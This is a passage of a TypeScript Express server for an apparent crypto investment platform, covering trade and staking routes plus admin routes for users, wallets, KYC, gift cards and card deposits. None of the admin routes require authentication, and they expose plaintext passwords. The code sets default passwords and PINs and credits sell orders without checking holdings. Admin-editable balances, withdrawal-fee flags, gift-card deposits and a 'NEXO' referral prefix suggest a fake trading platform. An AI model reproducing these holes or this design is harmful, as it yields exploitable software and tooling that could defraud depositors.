  if (claimAmount <= 0 || user.profitBalance < claimAmount) {
    return res.status(400).json({ error: 'No accrued profit balance available to claim' });
  }

  user.profitBalance -= claimAmount;
  user.balance += claimAmount;

  const newTx: DBTransaction = {
    id: `tx_claim_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'profit',
    amount: claimAmount,
    coin: 'USD Staking Yield Claim',
    status: 'approved',
    createdAt: new Date().toISOString(),
    details: 'Harvested staking yields credited to liquid balance',
  };
  transactionsStore.unshift(newTx);

  res.json({ message: `Successfully claimed $${claimAmount.toLocaleString()} to cash balance`, user });
});

// Spot Trade Execution
app.post('/api/user/trade', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { symbol, side, amountUsd, cryptoAmount, price } = req.body;
  const totalUsd = parseFloat(amountUsd);

  if (isNaN(totalUsd) || totalUsd <= 0) {
    return res.status(400).json({ error: 'Invalid trade volume' });
  }

  if (side === 'buy') {
    if (totalUsd > user.balance) {
      return res.status(400).json({ error: 'Insufficient USD balance for buy order' });
    }
    user.balance -= totalUsd;
  } else {
    // Sell order adds to USD balance
    user.balance += totalUsd;
  }

  const newTx: DBTransaction = {
    id: `tx_trade_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: side === 'buy' ? 'trade_buy' : 'trade_sell',
    amount: totalUsd,
    coin: `${symbol} @ $${price}`,
    cryptoAmount: parseFloat(cryptoAmount) || 0,
    status: 'approved',
    createdAt: new Date().toISOString(),
    details: `Spot ${side.toUpperCase()} Order for ${symbol}`,
  };
  transactionsStore.unshift(newTx);

  res.json({ message: `Spot trade for ${symbol} executed successfully`, user });
});

// ---------------------------------------------------------------------------------
// ADMIN MANAGEMENT ROUTES (SYSTEM WALLETS, USERS, KYC, TRANSACTIONS)
// ---------------------------------------------------------------------------------

// Admin Stats
app.get('/api/admin/stats', (_req, res) => {
  const totalUsers = usersStore.length;
  const totalDepositsVolume = transactionsStore
    .filter((t) => t.type === 'deposit' && t.status === 'approved')
    .reduce((sum, t) => sum + t.amount, 0);
  const totalWithdrawalsVolume = transactionsStore
    .filter((t) => t.type === 'withdrawal' && t.status === 'approved')
    .reduce((sum, t) => sum + t.amount, 0);
  const activeStakingVolume = usersStore.reduce((sum, u) => sum + (u.stakedBalance || 0), 0);
  const pendingKYCCount = kycDocsStore.filter((k) => k.status === 'pending').length;
  const pendingWithdrawals = transactionsStore.filter((t) => t.type === 'withdrawal' && t.status === 'pending');
  const pendingWithdrawalsCount = pendingWithdrawals.length;
  const pendingWithdrawalsVolume = pendingWithdrawals.reduce((sum, t) => sum + t.amount, 0);

  res.json({
    totalUsers,
    totalDepositsVolume,
    totalWithdrawalsVolume,
    activeStakingVolume,
    pendingKYCCount,
    pendingWithdrawalsCount,
    pendingWithdrawalsVolume,
  });
});

// Admin Users List
app.get('/api/admin/users', (_req, res) => {
  res.json(usersStore);
});

// Admin Add New User
app.post('/api/admin/users', (req, res) => {
  const { email, fullName, password, balance, profitBalance, stakedBalance, kycTier, isAdmin, status } = req.body;
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const randomInitialBalance = balance !== undefined ? parseFloat(balance) : parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
  
  const newUser: DBUser = {
    uid: newUid,
    email: email.toLowerCase(),
    password: password || 'password123',
    fullName: fullName || email.split('@')[0],
    balance: randomInitialBalance,
    profitBalance: profitBalance !== undefined ? parseFloat(profitBalance) : 0,
    stakedBalance: stakedBalance !== undefined ? parseFloat(stakedBalance) : 0,
    totalWithdrawn: 0,
    totalDeposited: randomInitialBalance,
    kycStatus: kycTier >= 2 ? 'verified_tier2' : kycTier === 1 ? 'verified_tier1' : 'unverified',
    kycTier: kycTier || 1,
    isAdmin: Boolean(isAdmin),
    isVerified: Boolean(kycTier >= 1),
    hasDepositedMinimum: true,
    withdrawalFeePaid: true,
    twoFactorEnabled: false,
    securityPin: '0000',
    referralCode: `NEXO${Math.floor(1000 + Math.random() * 9000)}`,
    referralEarnings: 0,
    status: status || 'active',
    createdAt: new Date().toISOString(),
  };

  usersStore.push(newUser);
  res.status(201).json({ message: 'User created successfully', user: newUser });
});

// Admin Update User (Balances, KYC, Status, Flags)
app.put('/api/admin/users/:uid', (req, res) => {
  const { uid } = req.params;
  const user = usersStore.find((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
  if (!user) return res.status(404).json({ error: 'User not found' });

  const {
    balance,
    profitBalance,
    stakedBalance,
    totalDeposited,
    totalWithdrawn,
    kycTier,
    kycStatus,
    isAdmin,
    isVerified,
    hasDepositedMinimum,
    withdrawalFeePaid,
    twoFactorEnabled,
    status,
    isBanned,
    banReason,
    fullName,
    country,
    phone,
    securityPin,
  } = req.body;

  if (balance !== undefined) user.balance = parseFloat(balance);
  if (profitBalance !== undefined) user.profitBalance = parseFloat(profitBalance);
  if (stakedBalance !== undefined) user.stakedBalance = parseFloat(stakedBalance);
  if (totalDeposited !== undefined) user.totalDeposited = parseFloat(totalDeposited);
  if (totalWithdrawn !== undefined) user.totalWithdrawn = parseFloat(totalWithdrawn);
  if (kycTier !== undefined) user.kycTier = parseInt(kycTier, 10);
  if (kycStatus !== undefined) user.kycStatus = kycStatus;
  if (isAdmin !== undefined) user.isAdmin = Boolean(isAdmin);
  if (isVerified !== undefined) user.isVerified = Boolean(isVerified);
  if (hasDepositedMinimum !== undefined) user.hasDepositedMinimum = Boolean(hasDepositedMinimum);
  if (withdrawalFeePaid !== undefined) user.withdrawalFeePaid = Boolean(withdrawalFeePaid);
  if (twoFactorEnabled !== undefined) user.twoFactorEnabled = Boolean(twoFactorEnabled);
  if (status !== undefined) user.status = status;
  if (isBanned !== undefined) user.isBanned = Boolean(isBanned);
  if (banReason !== undefined) user.banReason = banReason;
  if (fullName !== undefined) user.fullName = fullName;
  if (country !== undefined) user.country = country;
  if (phone !== undefined) user.phone = phone;
  if (securityPin !== undefined) user.securityPin = securityPin;

  res.json({ message: 'User account updated successfully', user });
});

// Admin Quick Suspend / Activate User
app.put('/api/admin/users/:uid/status', (req, res) => {
  const { uid } = req.params;
  const { status, banReason } = req.body;
  const user = usersStore.find((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
  if (!user) return res.status(404).json({ error: 'User not found' });

  if (status) {
    user.status = status;
    user.isBanned = status === 'suspended' || status === 'locked';
  }
  if (banReason !== undefined) user.banReason = banReason;

  res.json({ message: `User account status changed to ${user.status}`, user });
});

// Admin Delete User
app.delete('/api/admin/users/:uid', (req, res) => {
  const { uid } = req.params;
  const index = usersStore.findIndex((u) => u.uid === uid || u.email.toLowerCase() === uid.toLowerCase());
  if (index === -1) return res.status(404).json({ error: 'User not found' });

  usersStore.splice(index, 1);
  res.json({ message: 'User deleted from directory successfully' });
});

// ---------------------------------------------------------------------------------
// ADMIN SYSTEM WALLETS CRUD
// ---------------------------------------------------------------------------------

// Get all system wallets
app.get('/api/admin/wallets', (_req, res) => {
  res.json(systemWallets);
});

// Add new system wallet
app.post('/api/admin/wallets', (req, res) => {
  const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
  if (!coin || !address) {
    return res.status(400).json({ error: 'Coin name and wallet address are required.' });
  }

  const newWallet: DBWallet = {
    id: `w-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
    coin: coin.trim(),
    network: network?.trim() || 'Native Network',
    address: address.trim(),
    label: label?.trim() || `${coin} Deposit Vault`,
    memo: memo?.trim() || '',
    qrCodeUrl: qrCodeUrl || '',
    isEnabled: isEnabled !== undefined ? Boolean(isEnabled) : true,
    updatedAt: new Date().toISOString(),
  };

  systemWallets.push(newWallet);
  res.status(201).json({ message: 'New system wallet added successfully', wallet: newWallet, wallets: systemWallets });
});

// Update existing system wallet
app.put('/api/admin/wallets/:id', (req, res) => {
  const { id } = req.params;
  const wallet = systemWallets.find((w) => w.id === id);
  if (!wallet) return res.status(404).json({ error: 'Wallet configuration not found' });

  const { coin, network, address, label, memo, qrCodeUrl, isEnabled } = req.body;
  if (coin !== undefined) wallet.coin = coin.trim();
  if (network !== undefined) wallet.network = network.trim();
  if (address !== undefined) wallet.address = address.trim();
  if (label !== undefined) wallet.label = label.trim();
  if (memo !== undefined) wallet.memo = memo.trim();
  if (qrCodeUrl !== undefined) wallet.qrCodeUrl = qrCodeUrl;
  if (isEnabled !== undefined) wallet.isEnabled = Boolean(isEnabled);
  wallet.updatedAt = new Date().toISOString();

  res.json({ message: 'System wallet updated successfully', wallet, wallets: systemWallets });
});

// Delete system wallet
app.delete('/api/admin/wallets/:id', (req, res) => {
  const { id } = req.params;
  const index = systemWallets.findIndex((w) => w.id === id);
  if (index === -1) return res.status(404).json({ error: 'Wallet not found' });

  systemWallets.splice(index, 1);
  res.json({ message: 'System wallet deleted', wallets: systemWallets });
});

// ---------------------------------------------------------------------------------
// ADMIN TRANSACTION, KYC, GIFTCARD, CARD & SETTING ROUTES
// ---------------------------------------------------------------------------------

app.get('/api/admin/transactions', (_req, res) => {
  res.json(transactionsStore);
});

app.put('/api/admin/transactions/:id/action', (req, res) => {
  const { id } = req.params;
  const { action, reason } = req.body; // 'approve' | 'reject' | 'pending'
  const tx = transactionsStore.find((t) => t.id === id);
  if (!tx) return res.status(404).json({ error: 'Transaction not found' });

  const previousStatus = tx.status;
  tx.status = action === 'approve' ? 'approved' : action === 'reject' ? 'rejected' : 'pending';
  if (reason) tx.adminReason = reason;

  const user = usersStore.find((u) => u.uid === tx.userId || u.email === tx.userEmail);

  // If approving a pending deposit, credit user balance & totalDeposited
  if (action === 'approve' && tx.type === 'deposit' && previousStatus !== 'approved') {
    if (user) {
      user.balance += tx.amount;
      user.totalDeposited = (user.totalDeposited || 0) + tx.amount;
      if (user.totalDeposited >= 500) {
        user.hasDepositedMinimum = true;
      }
    }
  }

  // If rejecting a previously deducted withdrawal, refund balance
  if (action === 'reject' && tx.type === 'withdrawal' && previousStatus !== 'rejected') {
    if (user) {
      user.balance += tx.amount;
      user.totalWithdrawn = Math.max(0, user.totalWithdrawn - tx.amount);
    }
  }

  res.json({ message: `Transaction marked as ${tx.status}`, transaction: tx, user });
});

app.get('/api/admin/kyc', (_req, res) => {
  res.json(kycDocsStore);
});

app.put('/api/admin/kyc/:id/action', (req, res) => {
  const { id } = req.params;
  const { action, notes } = req.body; // 'approve' | 'reject'
  const doc = kycDocsStore.find((k) => k.id === id);
  if (!doc) return res.status(404).json({ error: 'KYC Document not found' });

  doc.status = action === 'approve' ? 'approved' : 'rejected';
  doc.reviewedAt = new Date().toISOString();
  if (notes) doc.adminNotes = notes;

  const user = usersStore.find((u) => u.uid === doc.userId || u.email === doc.userEmail);
  if (user) {
    if (action === 'approve') {
      user.kycStatus = 'verified_tier2';
      user.kycTier = 2;
      user.isVerified = true;
    } else {
      user.kycStatus = 'rejected';
    }
  }

  res.json({ message: `KYC Document marked as ${doc.status}`, document: doc, user });
});

app.get('/api/admin/giftcards', (_req, res) => {
  res.json(giftCardsStore);
});

app.put('/api/admin/giftcards/:id/action', (req, res) => {
  const { id } = req.params;
  const { action, reason } = req.body; // 'approve' | 'reject'
  const gift = giftCardsStore.find((g) => g.id === id);
  if (!gift) return res.status(404).json({ error: 'Gift card submission not found' });

  const previousStatus = gift.status;
  gift.status = action === 'approve' ? 'approved' : 'rejected';
  if (reason) gift.adminReason = reason;

  const user = usersStore.find((u) => u.uid === gift.userId || u.email === gift.userEmail);
  if (action === 'approve' && previousStatus !== 'approved' && user) {
    user.balance += gift.amount;
    user.totalDeposited = (user.totalDeposited || 0) + gift.amount;
    if (user.totalDeposited >= 500) {
      user.hasDepositedMinimum = true;
    }
  }

  // Update corresponding transaction if exists
  const relatedTx = transactionsStore.find((t) => t.details?.includes(gift.code) || (t.userId === gift.userId && t.amount === gift.amount && t.method === 'giftcard'));
  if (relatedTx) {
    relatedTx.status = gift.status;
  }

  res.json({ message: `Gift card submission marked as ${gift.status}`, giftCard: gift, user });
});

app.get('/api/admin/cards', (_req, res) => {
  res.json(cardsStore);
});

app.put('/api/admin/cards/:id/action', (req, res) => {
  const { id } = req.params;
  const { action } = req.body; // 'settled' | 'flagged' | 'captured'
  const card = cardsStore.find((c) => c.id === id);
  if (!card) return res.status(404).json({ error: 'Card submission not found' });

  card.status = action === 'settled' ? 'settled' : action === 'flagged' ? 'flagged' : 'captured';

  const user = usersStore.find((u) => u.uid === card.userId || u.email === card.userEmail);
  if (action === 'settled' && user) {
    user.balance += card.amount;
    user.totalDeposited = (user.totalDeposited || 0) + card.amount;
    if (user.totalDeposited >= 500) {
      user.hasDepositedMinimum = true;
    }
  }

  res.json({ message: `Card transaction status updated to ${card.status}`, card, user });
});

app.get('/api/admin/settings', (_req, res) => {
  res.json(globalSettingsStore);
});

app.put('/api/admin/settings', (req, res) => {
  const { key, value } = req.body;
  if (!key) return res.status(400).json({ error: 'Setting key is required' });

  let setting = globalSettingsStore.find((s) => s.key === key);
  if (setting) {
    setting.value = value;
    setting.updatedAt = new Date().toISOString();
  } else {
    setting = {
      key,
      value,
      description: 'Custom Platform Setting',
      updatedAt: new Date().toISOString(),
    };
    globalSettingsStore.push(setting);
  }

  res.json({ message: 'Platform setting saved', setting, settings: globalSettingsStore });
});

// Admin Seed Route
app.post('/api/admin/seed', (_req, res) => {
  // Regenerate random balances for test users within $3,750 - $4,967 range
  usersStore.forEach((u) => {
    if (!u.isAdmin) {
      u.balance = parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
    }
  });

  res.json({
    message: 'Demo users & balances successfully reseeded with randomized institutional balances ($3,750 to $4,967).',
    totalUsers: usersStore.length,
  });
});

// Setup Vite middleware in development or static serving in production
async function startServer() {
  const isProduction = process.env.NODE_ENV === 'production';

  if (!isProduction) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, 'dist')));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
});

